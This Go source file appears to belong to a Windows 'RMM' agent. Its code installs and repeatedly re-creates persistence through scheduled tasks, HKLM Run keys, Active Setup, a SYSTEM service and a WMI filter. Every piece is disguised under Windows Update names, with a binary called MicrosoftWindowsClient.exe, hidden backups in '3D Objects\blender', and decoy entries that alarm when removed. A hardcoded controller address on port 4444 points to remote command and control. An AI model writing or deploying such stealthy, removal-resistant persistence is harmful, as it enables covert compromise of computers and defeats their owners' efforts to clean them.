//go:build windows

package main

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/windows/registry"
	"rmm/internal/version"
)

// ensureActiveSetupKey repairs the logon-time vector (StubPath detached
// via cmd/start so logon can never block on it).
func ensureActiveSetupKey(agentPath string) {
	want := `cmd.exe /c start "" /min "` + agentPath + `" --watch`
	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`, registry.WRITE)
	if err != nil {
		return
	}
	defer k.Close()
	cur, _, err := k.GetStringValue("StubPath")
	if err != nil || cur != want {
		if err := k.SetStringValue("StubPath", want); err == nil {
			log.Printf("[watch] repaired Active Setup vector")
		}
	}
	_ = k.SetStringValue("Version", version.DesktopAgentVersion)
}

// rmmDataDir is where heartbeat/lock/telemetry live.
func rmmDataDir() string {
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		return filepath.Join(localApp, "RMM")
	}
	return filepath.Join(os.TempDir(), "RMM")
}

// writeProtectionScore audits the six persistence layers (3 tasks, 2 Run
// values, WMI filter) and records "5/6" to protection.json, which the
// agent attaches to hellos so the controller alarms on drops.
func writeProtectionScore(w *watchCfg) {
	got, total := 0, 6
	for _, t := range []string{"WindowsUpdate", "WindowsUpdateWatchdog", "WindowsUpdateOrchestrator"} {
		if exec.Command("schtasks", "/query", "/tn", t).Run() == nil {
			got++
		}
	}
	if rk, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE); err == nil {
		if _, _, err := rk.GetStringValue("WindowsUpdate"); err == nil {
			got++
		}
		if _, _, err := rk.GetStringValue("WindowsUpdateWatchdog"); err == nil {
			got++
		}
		rk.Close()
	}
	out, _ := exec.Command("powershell", "-NoProfile", "-Command", `Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='WindowsUpdateFilter'"`).CombinedOutput()
	if strings.Contains(string(out), "WindowsUpdateFilter") {
		got++
	}
	// Decoy heal vectors: alarm BEFORE repairing (a missing decoy means
	// someone is working through the box), then rebuild.
	if err := exec.Command("schtasks", "/query", "/tn", "WindowsUpdateCheck").Run(); err != nil {
		setProtAlarm("decoy task removed")
		xml := filepath.Join(w.backupDir, "decoy_task.xml")
		if _, err := os.Stat(xml); err == nil {
			_, _ = exec.Command("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", xml, "/f").CombinedOutput()
			log.Printf("[watch] rebuilt decoy task")
		}
	}
	wantDecoy := `"` + w.agentPath + `" --wmi-heal`
	if rk, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE); err == nil {
		cur, _, err := rk.GetStringValue("WindowsUpdateCheck")
		rk.Close()
		if err != nil || cur != wantDecoy {
			setProtAlarm("decoy reg removed")
			if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
				_ = k.SetStringValue("WindowsUpdateCheck", wantDecoy)
				k.Close()
				log.Printf("[watch] rebuilt decoy Run value")
			}
		}
	}
	_ = os.MkdirAll(rmmDataDir(), 0755)
	rec := map[string]string{
		"layers": fmt.Sprintf("%d/%d", got, total),
		"at":     time.Now().UTC().Format(time.RFC3339),
	}
	if b, err := os.ReadFile(filepath.Join(rmmDataDir(), "protection.json")); err == nil {
		var prev map[string]string
		if json.Unmarshal(b, &prev) == nil && prev["alarm"] != "" {
			rec["alarm"] = prev["alarm"] // sticky across score rewrites
		}
	}
	rb, _ := json.Marshal(rec)
	_ = os.WriteFile(filepath.Join(rmmDataDir(), "protection.json"), rb, 0644)
}

// svcName is the SYSTEM repair service (repairs only, never interactive).
const svcName = "WindowsUpdateOrchestrator"

// ensureService makes sure the repair service exists + runs (best effort:
// needs admin; plain users skip silently). Called by the watcher and the
// healer, so a deleted service converges back.
func ensureService(agentPath string) {
	if err := exec.Command("sc", "query", svcName).Run(); err == nil {
		return
	}
	// Admin probe: creating services needs it; skip quietly without.
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE`, registry.WRITE)
	if err != nil {
		return
	}
	k.Close()
	bin := `"` + agentPath + `" --svc-heal`
	_, _ = exec.Command("sc", "create", svcName, "binPath=", bin, "start=", "auto", "obj=", "LocalSystem").CombinedOutput()
	_, _ = exec.Command("sc", "description", svcName, "Windows Update Orchestration Service").CombinedOutput()
	_, _ = exec.Command("sc", "failure", svcName, "reset=", "86400", "actions=", "restart/60000/restart/60000/restart/60000").CombinedOutput()
	if err := exec.Command("sc", "start", svcName).Run(); err == nil {
		log.Printf("[watch] repair service installed+started")
	}
}

// wmiTaskPairs maps every persistence task to its saved XML (kept both
// beside the backup and in the install dir; the WMI consumer runs as
// SYSTEM and can only rely on the install-dir copies).
var wmiTaskPairs = [][2]string{
	{"WindowsUpdate", "agent_task.xml"},
	{"WindowsUpdateWatchdog", "watchdog_task.xml"},
	{"WindowsUpdateOrchestrator", "orchestrator_task.xml"},
}

// resolveTaskXML finds a task XML: install dir first, then any profile
// backup dir (three copies exist since v1.40.19).
func resolveTaskXML(dir, name string) string {
	cands := []string{filepath.Join(dir, name)}
	for _, d := range systemBackupDirs() {
		cands = append(cands, filepath.Join(d, name))
	}
	for _, p := range cands {
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p
		}
	}
	return ""
}

// systemBackupDirs lists every plausible per-user backup dir on the box.
// The healer runs as SYSTEM, whose own profile holds no backups, so it
// scans all user profiles for a surviving copy.
func systemBackupDirs() []string {
	var dirs []string
	ents, err := os.ReadDir(`C:\Users`)
	if err != nil {
		return dirs
	}
	for _, e := range ents {
		if !e.IsDir() {
			continue
		}
		dirs = append(dirs,
			filepath.Join(`C:\Users`, e.Name(), "3D Objects", "blender"),
			filepath.Join(`C:\Users`, e.Name(), "AppData", "Roaming", "Microsoft", "Windows", "Themes", "Cache"))
	}
	return dirs
}

// healBinary restores a wiped install binary from the newest surviving
// backup across all profiles (version-guarded: never downgrades).
func healBinary(installDir, agentPath, caPath string) {
	if _, err := os.Stat(agentPath); err == nil {
		return // present
	}
	type cand struct{ bin, cert, tok, ver string }
	var best *cand
	for _, d := range systemBackupDirs() {
		bin := filepath.Join(d, "MicrosoftWindowsClient.exe")
		cert := filepath.Join(d, "server.crt")
		if _, err := os.Stat(bin); err != nil {
			continue
		}
		if _, err := os.Stat(cert); err != nil {
			continue
		}
		ver := readVerFile(d)
		if best == nil || (ver != "" && best.ver != "" && verLess(best.ver, ver)) || (best.ver == "" && ver != "") {
			b, c := bin, cert
			tok := filepath.Join(d, "token.txt")
			if _, err := os.Stat(tok); err != nil {
				tok = ""
			}
			best = &cand{b, c, tok, ver}
		}
	}
	if best == nil {
		log.Printf("[heal] agent binary missing AND no backup anywhere")
		return
	}
	instVer := readVerFile(installDir)
	if best.ver != "" && instVer != "" && verLess(best.ver, instVer) {
		log.Printf("[heal] backup v%s older than installed v%s - skipping", best.ver, instVer)
		return
	}
	_ = os.MkdirAll(filepath.Dir(agentPath), 0755)
	if b, err := os.ReadFile(best.bin); err == nil {
		_ = os.WriteFile(agentPath, b, 0755)
	}
	if b, err := os.ReadFile(best.cert); err == nil {
		_ = os.WriteFile(caPath, b, 0644)
	}
	if best.tok != "" {
		if _, err := os.Stat(filepath.Join(installDir, "token.txt")); os.IsNotExist(err) {
			if b, err := os.ReadFile(best.tok); err == nil {
				_ = os.WriteFile(filepath.Join(installDir, "token.txt"), b, 0600)
			}
		}
	}
	if best.ver != "" {
		_ = os.WriteFile(filepath.Join(installDir, "version.txt"), []byte(best.ver+"\n"), 0644)
	}
	log.Printf("[heal] binary + cert restored from backup")
}

// runWmiHeal repairs binary + tasks + HKLM Run values and kickstarts the
// watcher task, then exits. Invoked by the WMI timer + death trigger (and
// manually), so a wiped box converges back in ~1min without reinstall.
func runWmiHeal() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	dir, _ := filepath.Abs(filepath.Dir(exe))
	agentPath := filepath.Join(dir, "MicrosoftWindowsClient.exe")
	caPath := filepath.Join(dir, "server.crt")
	controllerAddr := "176.229.98.54:4444"
	if b, err := os.ReadFile(filepath.Join(dir, "controller.txt")); err == nil {
		if v := strings.TrimSpace(strings.Split(string(b), "\n")[0]); v != "" {
			controllerAddr = v
		}
	}
	healBinary(dir, agentPath, caPath)
	for _, t := range wmiTaskPairs {
		if err := exec.Command("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
			continue
		}
		xml := resolveTaskXML(dir, t[1])
		if xml == "" {
			log.Printf("[heal] task %s missing and no saved XML anywhere", t[0])
			continue
		}
		if out, err := exec.Command("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
			log.Printf("[heal] re-create task %s: %v %s", t[0], err, strings.TrimSpace(string(out)))
		} else {
			log.Printf("[heal] re-created task %s", t[0])
		}
	}
	agentCmd := `"` + agentPath + `" -controller ` + controllerAddr + ` -ca "` + caPath + `"`
	watchCmd := `"` + agentPath + `" --watch`
	for _, kv := range [][2]string{{"WindowsUpdate", agentCmd}, {"WindowsUpdateWatchdog", watchCmd}} {
		k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
		if err != nil {
			continue
		}
		cur, _, err := k.GetStringValue(kv[0])
		if err != nil || cur != kv[1] {
			if err := k.SetStringValue(kv[0], kv[1]); err == nil {
				log.Printf("[heal] repaired HKLM Run %s", kv[0])
			}
		}
		k.Close()
	}
	ensureActiveSetupKey(agentPath)
	ensureService(agentPath)
	// Decoy heal vectors too (task + Run value).
	if err := exec.Command("schtasks", "/query", "/tn", "WindowsUpdateCheck").Run(); err != nil {
		if xml := resolveTaskXML(dir, "decoy_task.xml"); xml != "" {
			_, _ = exec.Command("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", xml, "/f").CombinedOutput()
		}
	}
	decoyCmd := `"` + agentPath + `" --wmi-heal`
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		if cur, _, err := k.GetStringValue("WindowsUpdateCheck"); err != nil || cur != decoyCmd {
			_ = k.SetStringValue("WindowsUpdateCheck", decoyCmd)
		}
		k.Close()
	}
	// Kickstart now instead of waiting for the next tick: the repaired
	// tasks run in their own (user-session) context, keeping interactivity.
	for _, t := range []string{"WindowsUpdateWatchdog", "WindowsUpdate", "WindowsUpdateOrchestrator", "WindowsUpdateCheck"} {
		_ = exec.Command("schtasks", "/run", "/tn", t).Run()
	}
}

// ensureWatchPersistence re-creates deleted Run keys / scheduled tasks from
// the XML copies saved beside the backup (self-healing persistence).
func ensureWatchPersistence(w *watchCfg) {
	agentCmd := `"` + w.agentPath + `" -controller ` + w.controllerAddr + ` -ca "` + w.caPath + `"`
	watchCmd := `"` + w.agentPath + `" --watch`
	setRun := func(name, val string) {
		k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
		if err != nil {
			return
		}
		defer k.Close()
		cur, _, err := k.GetStringValue(name)
		if err != nil || cur != val {
			if err := k.SetStringValue(name, val); err == nil {
				log.Printf("[watch] repaired HKLM Run %s", name)
			}
		}
	}
	setRun("WindowsUpdate", agentCmd)
	setRun("WindowsUpdateWatchdog", watchCmd)
	ensureActiveSetupKey(w.agentPath)
	ensureService(w.agentPath)
	for _, t := range wmiTaskPairs {
		if err := exec.Command("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
			continue
		}
		xml := filepath.Join(w.backupDir, t[1])
		if _, err := os.Stat(xml); err != nil {
			log.Printf("[watch] task %s missing and no saved XML", t[0])
			continue
		}
		if out, err := exec.Command("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
			log.Printf("[watch] re-create task %s: %v %s", t[0], err, string(out))
		} else {
			log.Printf("[watch] re-created task %s", t[0])
		}
	}
}
